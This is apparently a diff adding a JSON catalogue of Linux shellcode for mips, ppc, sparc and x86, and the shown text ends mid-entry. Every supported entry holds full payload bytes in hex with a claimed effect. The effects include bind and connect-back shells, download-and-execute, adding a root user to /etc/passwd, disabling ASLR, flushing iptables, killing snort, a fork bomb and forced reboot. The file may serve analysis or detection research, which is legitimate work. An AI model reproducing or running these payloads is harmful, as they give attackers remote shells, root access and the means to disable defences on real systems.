+    "bytes_hex": "50730624ffffd00450730f24ffff0628e0ffbd27d7ff0f242778e0012120ef03e8ffa4afecffa0afe8ffa523ab0f02240c010101",
+    "claimed_effect": "execve(-bin-sh,[-bin-sh],[]);",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/mips/execve_-bin-sh.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "mips",
+    "byte_count": 48,
+    "bytes_hex": "2806ffff3c0f2f2f35ef6269afaffff43c0e6e2f35ce7368afaefff8afa0fffc27a4fff42805ffff24020fab0101010c",
+    "claimed_effect": "execve -bin-sh",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/mips/port_bind_4919.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "mips",
+    "byte_count": 268,
+    "bytes_hex": "e0ffbd27fdff0e242720c0012728c001ffff0628571002240c01010150730f24ffff5030efff0e242770c00113370d240468cd01fffd0e242770c0012568ae01e0ffadafe4ffa0afe8ffa0afecffa0af25201002efff0e242730c001e0ffa523491002240c01010150730f2425201002010105244e1002240c01010150730f2425201002ffff0528ffff0628481002240c01010150730f24ffff503025201002fdff0f242728e001df0f02240c01010150730f242520100201010528df0f02240c01010150730f2425201002ffff0528df0f02240c01010150730f2450730624ffffd00450730f24ffff0628dbff0f242778e0012120ef03f0ffa4aff4ffa0aff0ffa523ab0f02240c010101",
+    "claimed_effect": "port bind 4919",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/mips/reboot().c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "mips",
+    "byte_count": 32,
+    "bytes_hex": "3c06432134c6fedc3c05281234a519693c04fee13484dead24020ff80101010c",
+    "claimed_effect": "reboot()",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/ppc/connect_back_execve_-bin-sh.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "ppc",
+    "byte_count": 232,
+    "bytes_hex": "7c3f0b783b40010e3b5afef47f43d3783b60010d3b7bfef47f64db787ca52a787c3c0b783b9c010c907cff08909cff0c90bcff107f63db783bdf010c389eff083b2001987f20167044deadf27c781b78b35eff167fbdea7863bd7a69b3beff183fa0c0a863bd010193beff1a931cff083adeff1692dcff0c3ba0011c38bdfef490bcff107f2016707c7ada14389cff0844deadf27f03c3787c8422783ae001f87ee01e7044deadf27f03c3787f64db787ee01e7044deadf27ca52a794240ff357f0802a63b18013498b8fefb3878fef49061fff83881fff890a1fffc3bc001607fc02e7044deadf2",
+    "claimed_effect": "connect back execve -bin-sh",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/ppc/execve_-bin-sh.c",
+    "bucket": "other",
+    "os": "Linux",
+    "arch": "ppc",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "execve -bin-sh",
+    "supported": false
+  },
+  {
+    "source_file": "Linux/ppc/read_&_exec_shellcode.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "ppc",
+    "byte_count": 32,
+    "bytes_hex": "7c631a7938a004043005fbff7c240b7844deadf2696969697c2903a64e800421",
+    "claimed_effect": "read & exec shellcode",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/sparc/Portbind_8975-tcp.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "sparc",
+    "byte_count": 284,
+    "bytes_hex": "9de3bf7890102002921020019422800ad023a044d223a048d423a04c901020019203a044821020ce91d02010d027bff490102002d037bfd81308c8c89012630fd037bfdac027bfdc9207bfd8d007bff494102010d023a044d223a048d423a04c901020029203a044821020ce91d02010d007bff492102005d023a044d223a048901020049203a044821020ce91d020109207bfd89407bfecd007bff4d023a044d223a048d423a04c901020059203a044821020ce91d02010d027bff0d007bff0922240098210205a91d02010d007bff0921020018210205a91d02010d007bff0921020028210205a91d020102d0bd89aac15a16e2f0bdcda900b800e9203a0089422800a9c03a010ec3bbff0d023bff8c023bffc8210203b91d02010",
+    "claimed_effect": "Portbind 8975-tcp",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/sparc/[setreuid(0,0);_execve()_of_-bin-sh]_.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "sparc",
+    "byte_count": 64,
+    "bytes_hex": "8210207e92224009900a400991d020102d0bd89aac15a16e2f0bdcda900b800e9203a0089422800a9c03a010ec3bbff0d023bff8c023bffc8210203b91d02010",
+    "claimed_effect": "[setreuid(0,0); execve() of -bin-sh]",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/sparc/connect_back.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "sparc",
+    "byte_count": 216,
+    "bytes_hex": "9de3bf8090102002d037bfe090102909d037bfe213302a1990126001d027bfe4901020029210200194226001d023a044d223a048d423a04c901020019203a044821020ce91d02010d027bff49207bfe0d007bff494102010d023a044d223a048d423a04c901020039203a044821020ce91d02010d007bff4921a40098210205a91d02010d007bff4921020018210205a91d02010d007bff4921020028210205a91d020102d0bd89aac15a16e2f0bdcda900b800e9203a008a61020019424e0019c03a010ec3bbff0d023bff8c023bffc8210203b91d02010",
+    "claimed_effect": "connect back",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/sparc/setreuid(0,0)&standard;_execve().c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "sparc",
+    "byte_count": 72,
+    "bytes_hex": "901a40098210201791d02010901a40098210202e91d020102d0bd89aac15a16e2f0bdcda900b800e9203a008941a800a9c03a010ec3bbff0d023bff8c023bffc8210203b91d02010",
+    "claimed_effect": "setreuid(0,0)&standard; execve()",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/---sbin-iptables_-POUTPUT_DROP.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 60,
+    "bytes_hex": "31c031d2506844524f5089e7506854505554682d504f5589e15068626c657368697074616862696e2f682f2f2f7389e35057515389e131d2b00bcd80",
+    "claimed_effect": "---sbin-iptables -POUTPUT DROP",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/-bin-cp_-bin-sh_-tmp-katy_&_chmod_4555.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 101,
+    "bytes_hex": "eb5e5f31c088470788470f884719897f1a8d770889771e31f68d771089772289472689fb8d4f1a8d572631c0b002cd8031f639c67506b00bcd80eb1d31d231c031db4b8d4f26b007cd8031c08d5f1031c966b96d09b00fcd8031c04031dbcd80e89dffffff",
+    "claimed_effect": "-bin-cp -bin-sh -tmp-katy & chmod 4555",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/-bin-nc_-le_-bin-sh_-vp_17771.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 58,
+    "bytes_hex": "31c031d2506837373731682d76703189e650682f2f7368682f62696e682d6c652f89e750682f2f6e63682f62696e89e35256575389e1b00bcd80",
+    "claimed_effect": "-bin-nc -le -bin-sh -vp 17771",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/-bin-sh.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 8,
+    "bytes_hex": "996a0b586059cd80",
+    "claimed_effect": "-bin-sh",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/-bin-sh_Null-Free_Polymorphic.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 46,
+    "bytes_hex": "eb1231c95e565fb1158a06fec8880646e2f7ffe7e8e9ffffff32c132ca5269307469016930636a6f8ae4b10cce81",
+    "claimed_effect": "-bin-sh Null-Free Polymorphic",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/-bin-sh_polymorphic_shellcode.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 48,
+    "bytes_hex": "eb115e31c9b132806c0eff0180e90175f6eb05e8eaffffff32c15169303074696930636a6f8ae451548ae29ab10cce81",
+    "claimed_effect": "-bin-sh polymorphic shellcode",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/-bin-sh_sysenter_Opcode_Array_Payload.c",
+    "bucket": "other",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "-bin-sh sysenter Opcode Array Payload",
+    "supported": false
+  },
+  {
+    "source_file": "Linux/x86/-etc-init.d-apparmor_teardown.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 53,
+    "bytes_hex": "6a0b5831d25268646f776e687465617289e15268726d6f72686170706168742e642f682f696e69682f65746389e352515389e1cd80",
+    "claimed_effect": "-etc-init.d-apparmor teardown",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/-sbin-iptables_--flush.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 69,
+    "bytes_hex": "31c031dbb002cd8039d8752d31c05066682d4689e65068626c657368697074616862696e2f682f2f2f7389e38d54241050565489e1b00bcd8089c331c031c931d2b007cd80",
+    "claimed_effect": "-sbin-iptables --flush",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/-usr-bin-killall_snort.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 46,
+    "bytes_hex": "31c0506a7468736e6f7289e650686c616c6c682f6b696c682f62696e682f75737289e350565389e131d2b00bcd80",
+    "claimed_effect": "-usr-bin-killall snort",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/ASLR_deactivation.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 83,
+    "bytes_hex": "31c05068706163656876615f7368697a655f686e646f6d686c2f72616865726e656879732f6b686f632f73682f2f707289e366b9bc02b008cd8089c35066ba303a665289e131d242b004cd80b006cd8040cd80",
+    "claimed_effect": "ASLR deactivation",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Add_User_USER=t00r_PASS=t00r.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 116,
+    "bytes_hex": "29c983e9e9d9eed97424f45b817313fd9634e483ebfce2f4cc5fbd2f97d06c297dfc31bccc5f658c8ee5438095b91b949cfe1b8189f5bd07bc2330297d05dcc6fd963490cda646debcd76dafaac05eb6b1a05e8fb4ac04decdac0ecbc7b9568d93b9478cf7cfbfb501fc30bc30165ee5a55bb4e4",
+    "claimed_effect": "Add User USER=t00r PASS=t00r",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Add_map_in_-etc-hosts_file.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 77,
+    "bytes_hex": "31c9f7e1b00551686f737473682f2f2f68682f65746389e366b90104cd80936a0458eb10596a145acd806a0658cd806a0158cd80e8ebffffff3132372e312e312e3120676f6f676c652e636f6d",
+    "claimed_effect": "Add map in -etc-hosts file",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Add_root_user_-etc-passwd.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 104,
+    "bytes_hex": "eb035feb05e8f8ffffff31dbb33501fb30c088430b31c966b9410431d266baa40131c0b005cd8089c331c9b14101f931d2b21f31c0b004cd8031c0b001cd802f6574632f706173737764017730307730303a3a303a303a7730773077213a2f3a2f62696e2f73680a",
+    "claimed_effect": "Add root user -etc-passwd",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Alpha-Numeric_using_IMUL_Method.c",
+    "bucket": "other",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "Alpha-Numeric using IMUL Method",
+    "supported": false
+  },
+  {
+    "source_file": "Linux/x86/Audio_(knock_knock_knock)_via_-dev-dsp+setreuid(0,0)+execve().c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 566,
+    "bytes_hex": "eb035eeb05e8f8ffffff83c60f31c966b91c0280360346e2faeab80303032c616a6d2c706b037d0393939393939393939393939393939393937f7975767677726e69686d707676726e69646560635e58585e5d5d5e5c61646e7078a5afb1b5bfbcc0c6c6c1c2bdbeb9bbb6acaaa06d6f666a69645526334d545d43383546406360615548494d5d666e6a6463595463696f707a7b777b7975716d72727071726d7270707079766c6d6f6e6870756e6565696872757d7f7e7d7f7978787e797e7d7f7475777075797f787a7571737209032c6766752c6770730382ef642803038af5568ae680ef1f545550eb030303035882c0b9120303c446fb03030303c446ff030303038e8076eefcfc8a46fb8eb87eeefcfc8e9093eefcfc8a56eb8e8824edfcfc8acdbb06030303ba02030303b983020303508af0ce838a46f7bb2a0303038876f7508af0ce838a46e7bb070303038876e7884eebb995030303508af0ce83bb07030303508af0ce83c446f303030303bb070303038876e78afab902030303508af0ce83fc46f3827ef3540103037de3bb07030303884eebb995030303508af0ce83bb07030303508af0ce83c446f30303030393bb070303038876e78afab902030303508af0ce83fc46f3827ef3540103037de3bb07030303884eebb995030303508af0ce83bb07030303508af0ce83bb05030303508af0ce83bb050303038876f7508af0ce83bb4503030332f532ca508af0ce838e7efbbb080303038876fb8afa32d1508af0ce8332c38e66db585d5ccac09369",
+    "claimed_effect": "Audio (knock knock knock) via -dev-dsp+setreuid(0,0)+execve()",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Bind_TCP_Port.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 103,
+    "bytes_hex": "66bd2b676a6658996a015b52536a0289e1cd8089c65fb0666a045457535689e1b30ecd80b06689fb526655665389e16a10515689e1cd80b066b304525689e1cd80b0664389542408cd809389f9b03fcd804979f9b00b52682f2f7368682f62696e89e35253eba8",
+    "claimed_effect": "Bind TCP Port",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Bindport_TCP-3879.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 113,
+    "bytes_hex": "89e531d2b26689d031c989cb43895df843895df44b894dfc8d4df4cd8031c98945f44366895dec66c745ee0f27c745f07f0101018d45ec8945f8c645fc1089d0438d4df4cd8031c9b03fcd804183f90375f6eb185e89750831c088460789450cb00b89f38d4d088d550ccd80e8e3ffffff",
+    "claimed_effect": "Bindport TCP-3879",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Bindshell_TCP-5074.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 42,
+    "bytes_hex": "eb02eb05e8f9ffffff5f81efdfffffff575e29c980c1b88a072c41c0e0044702072c418806464749e2ed",
+    "claimed_effect": "Bindshell TCP-5074",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Connect-Back_port_UDP-54321.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 151,
+    "bytes_hex": "6a66586a015b31c9516a026a0289e1cd80687f0101016668d4316631c980c102665189e16a10515089e189c6b06680c302cd8087de6a01596a3f58cd8031d26a0258cd8039d074056a0158cd806a0b58526834333231682021203568706f727489e7526a2d66682d7789e6526a79682d69616e89e1526a70687064756d686e2f7463682f736269682f75737289e3525756515389e1cd80",
+    "claimed_effect": "Connect-Back port UDP-54321",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/ConnectBack_with_SSL_connection.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 422,
+    "bytes_hex": "31c0506a65686b706970682f626163682f746d7089e3b00acd8085c0753231c031db31d2b30131c0506a6e6668645c686c6574656865206465686b706970682f626163682f746d7089e1b217b004cd8031c0506668736c682f636273682f746d7089e3b00acd8085c0752a31c031db31d2506865645c6e68656c657468736c2064682f636273682f746d7089e1b301b214b004cd8031c031c931d266b9410466baa401506668736c682f636273682f746d7089e3b005cd8089c631d289f331c0506668706568636b706968702f6261683e2f746d6873682031686e2f746368202f6269687065207c68636b706968702f6261683c2f746d683830203068743a3830686c686f73686c6f6361686563742068636f6e6e686e74202d68636c6965686c20735f68656e7373686e2f6f7068722f626968202f7573687020262668697065206861636b70686d702f626864202f74686d6b6e6f89e1b27731c0b004cd8031c0b00689f3cd8031c0506668736c682f636273682f746d7089e35066682d6589e1506a6866682f73682f62696e89e25053515289e189d331d2b00bcd8031c0b00131dbcd80",
+    "claimed_effect": "ConnectBack with SSL connection",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Connect_Back_shellcode.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 76,
+    "bytes_hex": "31c06a015b50536a0289e1b066cd805b435f68810424688104246a10515089e1b066cd805b31c96a3f58cd804180f90375f531c050682f2f7368682f62696e89e3505389e199b00bcd80ebfe",
+    "claimed_effect": "Connect Back shellcode",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Copy_-etc-passwd_to_-tmp-outfile.c",
+    "bucket": "asm",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "Copy -etc-passwd to -tmp-outfile",
+    "supported": false
+  },
+  {
+    "source_file": "Linux/x86/Disable_randomize_stack_addresse.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 106,
+    "bytes_hex": "31db6a6189e3b00acd8031db6a656668616368615f7370687a655f7668646f6d69682f72616e68726e656c68732f6b6568632f7379682f70726f89e330c0b01131c966b9410431d266baa40131c0b005cd8089c331c96668300a89e131d2b20231c0b004cd80b001cd80",
+    "claimed_effect": "Disable randomize stack addresse",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/DoS-Badger-Game.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 6,
+    "bytes_hex": "31c0b01dcd80",
+    "claimed_effect": "DoS-Badger-Game",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Download_+_chmod_+_exec.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 108,
+    "bytes_hex": "31c0b002cd8031db39d8742a31c0b007cd8031c931c050b00f6a7889e331c966b9ff01cd8031c0506a7889e35089e25389e1b00bcd806a0b58995268322f2f7868322e3232683136382e683139322e89e1526a74682f776765682f62696e682f75737289e352515389e1cd80",
+    "claimed_effect": "Download + chmod + exec",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Egg_Hunter_Shellcode.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 38,
+    "bytes_hex": "905090509050905031dbf7e3b0046a0a684d61726b6845676720b30189e1b209cd80b001cd80",
+    "claimed_effect": "Egg Hunter Shellcode",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Encrypted_execve_-bin-sh_with_uzumaki_algorithm.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 50,
+    "bytes_hex": "29c974145eb114468b0683e809349f3246ff8806e2f1eb05e8e7ffffff3170aa92d72dceafe1a8cc8da8e1db9da181febadb",
+    "claimed_effect": "Encrypted execve -bin-sh with uzumaki algorithm",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/File_Reader_-etc-passwd.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 65,
+    "bytes_hex": "31c031db31c931d2eb325bb00531c9cd8089c6eb06b00131dbcd8089f3b00383ec018d0c24b201cd8031db39c374e6b004b301b201cd8083c401ebdfe8c9ffffff",
+    "claimed_effect": "File Reader -etc-passwd",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/File_unlinker_18_bytes_+_file_path_length.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 18,
+    "bytes_hex": "eb0b5bb00acd80b00131dbcd80e8f0ffffff",
+    "claimed_effect": "File unlinker 18 bytes + file path length",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Find_all_writeable_folder_in_filesystem_linux_polymorphic_shellcode.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 91,
+    "bytes_hex": "eb115e31c9b143806c0eff3580e90175f6eb05e8eaffffff9566f56607e540879da364a89d9d6464979ebe18879d62989898be1687203c8688be1602b5961d293434349b9ea39955645562a9aea59a55995562a59aa7a2556c6c6c",
+    "claimed_effect": "Find all writeable folder in filesystem linux polymorphic shellcode",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Followtheleader_custom_execve-shellcode_Encoder-Decoder.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 136,
+    "bytes_hex": "eb4e5e8d3e31c9f7e131ed8a1688d0c0ea04c1e01cc1e81c28c27904f6d2fec231c031db31c98a442e0189e980f132742488c128d188cb88c8c0eb04c1e01cc1e81801d8b3ff28c3881f4783c502ebd0e8adffffff43ed1df440fb6f7aa90eb60ebcc9e37aaf7a780ec5da766a171a4e6838c299fb356884d2b3cb7c6878e29af5e950c02491f8fe",
+    "claimed_effect": "Followtheleader custom execve-shellcode Encoder-Decoder",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Force_Reboot_shellcode_36_bytes.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 36,
+    "bytes_hex": "31c05068626f6f74686e2f7265682f73626989e35066682d6689e650565389e1b00bcd80",
+    "claimed_effect": "Force Reboot shellcode 36 bytes",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/HTTP-1.x_GET,_Downloads_&_execve().c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 110,
+    "bytes_hex": "6a6658996a015b52536a0289e1cd805b5e68efbeaddebdfdffffaff7d555436a105150b06689e1cd805fb008526a4189e35059cd809687dfb00489e1cd80994249b003cd8081390a0d0a0d75f3b204b003f8cd8087de72f785c07405b004f9ebf1b006cd8099b00b89fb5253ebcc",
+    "claimed_effect": "HTTP-1.x GET, Downloads & execve()",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/HTTP-1.x_GET,_Downloads_and_JMP.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 68,
+    "bytes_hex": "6a6658996a015b52536a0289e1cd805b5dbe80fffffe66bd911ff7d6560fcd09dd55436a105150b06689e1cd8089e1b004cd80b0036a015acd804185c075f483e906ffe1",
+    "claimed_effect": "HTTP-1.x GET, Downloads and JMP",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Ifconfig_eth0_down.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 51,
+    "bytes_hex": "6a0b58995268646f776e89e652686574683089e152686e666967686966636f68696e2f2f682f2f736289e35256515389e1cd80",
+    "claimed_effect": "Ifconfig eth0 down",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Insertion_Decoder_Shellcode.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 70,
+    "bytes_hex": "eb1a5e8d3e31c98b1c0e416681fbf1f1740f80fb3f74f0881f47ebebe8e1ffffff3f3f3f313fc93ff7e13fb00b3f51683f2f2f3f73683f682f3f62693f6e893fe3cd3f80f1f1",
+    "claimed_effect": "Insertion Decoder Shellcode",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/JMP-FSTENV_execve_shell.c",
+    "bucket": "asm",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "JMP-FSTENV execve shell",
+    "supported": false
+  },
+  {
+    "source_file": "Linux/x86/Kill_service_apache2_+_pure-ftpd_+_sshd.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 81,
+    "bytes_hex": "6a0b5899526a3266686865686170616389e752687373686489e5526a64682d667470687075726589e65266682d3989e152686c616c6c682f6b696c682f62696e682f75737289e352575556515389e1cd80",
+    "claimed_effect": "Kill service apache2 + pure-ftpd + sshd",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Linux_x86_setreuid(0,0)_execve(-bin-zsh,_[-bin-zsh,_NULL])_+_XOR.c",
+    "bucket": "other",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "Linux x86 setreuid(0,0) execve(-bin-zsh, [-bin-zsh, NULL]) + XOR",
+    "supported": false
+  },
+  {
+    "source_file": "Linux/x86/Magic_Byte_Self_Modifying_Code_for_surviving.c",
+    "bucket": "other",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 0,
+    "bytes_hex": null,
+    "claimed_effect": "Magic Byte Self Modifying Code for surviving",
+    "supported": false
+  },
+  {
+    "source_file": "Linux/x86/Multi-Egghunter.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 23,
+    "bytes_hex": "6a0259575131c96681c9ff0f416a4358cd803cf274f1b8",
+    "claimed_effect": "Multi-Egghunter",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Mutated_Execve_Wget.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 96,
+    "bytes_hex": "eb01e829db740183f7e3bdf5ffffffeb01e8684165457229f67401835e5681f6254a1f3e56eb01336869732e678944240c89e16a74eb01e3682f776765eb0183682f62696eeb0133682f7573728d1c24eb018350515389e1f7dd95eb0183cd80",
+    "claimed_effect": "Mutated Execve Wget",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Mutated_Fork_Bomb.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 15,
+    "bytes_hex": "31ffeb01e8b21d9783e81bcd80ebf1",
+    "claimed_effect": "Mutated Fork Bomb",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Mutated_Reboot.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 55,
+    "bytes_hex": "29ff7401e883c72497eb01e1cd80eb01ff6a2959eb0101bb67452301baca9bc2ff31da7501e787da8d412f8d8940191228eb02e801cd80",
+    "claimed_effect": "Mutated Reboot",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Obfuscated.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 521,
+    "bytes_hex": "31c031db31c931d2bb59454f53ba3336383731d353c1eb0853bb7a465945ba5536383631d353bb6758454eba483d312d31d35389e3684141ff0159c1e908c1e9086a0f58cd80bb5349574aba392d383d31d3c1eb0853bb6d474558ba42342d3931d353bb6e544957ba41313d3431d35389e3684141ff0159c1e908c1e9086a0f58cd80bb73474e51ba3234393531d3c1eb0853bb59445644ba7634373731d353bb4e585951ba613d2d3231d35389e3684141010459c1e908c1e9086a0558cd8089c36a0458684173680a59c1e90851b957675758ba3948353931d151b94e645a51ba744b383831d151b947575642ba3538393631d151b96170514eba2d396b6131d151b948587074ba72684a3531d151b976455646ba3d6b6c7631d15168667755576868703150687a5965416841614151684938757468504d5968685442747a68512f38546845366d676876502e73684e58523768394b554868722f59426856784b47683955665a6846566a6868466338796870596a716877695368686e54675468584d6937682f416e246870556e4d682436246ab973617467ba322d3d5d31d15189e1ba4141417fc1ea08c1ea08c1ea08cd8031c0b04631db31c9cd8031c0b04631db31c9cd8068525548426852514943b9494b5977ba6638313531d151b955555457ba7a373d3931d15189e331c0884307895b0889430cb00b8d4b088d530ccd80b001b301cd80",
+    "claimed_effect": "Obfuscated",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Obfuscated_execve_-bin-sh.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 30,
+    "bytes_hex": "31c9f7e951040beb085e87e69987dccd80e8f3ffffff2f62696e2f2f7368",
+    "claimed_effect": "Obfuscated execve -bin-sh",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Obfuscated_tcp_bind_shell.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 112,
+    "bytes_hex": "d9ee9bd97424f45d8d6d5931dbf7ebfec3516a066a016a02ffd589c6fec35266687a69665389e16a105156ffd5b3046a0156ffd5b305525256ffd589c331c9b103fec9b03fcd8075f831dbf7e351eb135e87e687dcb00bcd805f6a665889e1cd8057c3e8e8ffffff2f62696e2f2f7368",
+    "claimed_effect": "Obfuscated tcp bind shell",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Password_Authentication_portbind_port_64713-tcp.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 166,
+    "bytes_hex": "6a66586a015b9952536a0289e1cd80526668fcc9666a0289e16a10515089e189c643b066cd80b066d1e3cd8052525689e143b066cd8096526872643a20687373776f6668506189e76a0a575689e1b309b066cd80526a088d4c2408515689e1b30ab066cd8087f3526861756c7468676f746689e78d74241c89d180c108fcf3a67404f7f0cd806a0259b03fcd804979f96a0b5852682f2f7368682f62696e89e3525389e1cd80",
+    "claimed_effect": "Password Authentication portbind port 64713-tcp",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Perl_script_execution_99_bytes_+_script_length.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 99,
+    "bytes_hex": "31c031db31c931d231ff31f65068302e706c6870743030687363726989e3b005b141cd80eb3889de89c35f5731c931c0f7d1f2aef7d1495f89c889f989c2b004cd80b006cd8089f3b00f66b9fc01cd80b00b31c931d2cd80b00131dbcd80e8c3ffffff",
+    "claimed_effect": "Perl script execution 99 bytes + script length",
+    "supported": true
+  },
+  {
+    "source_file": "Linux/x86/Polymorphic.c",
+    "bucket": "hex",
+    "os": "Linux",
+    "arch": "x86",
+    "byte_count": 61,
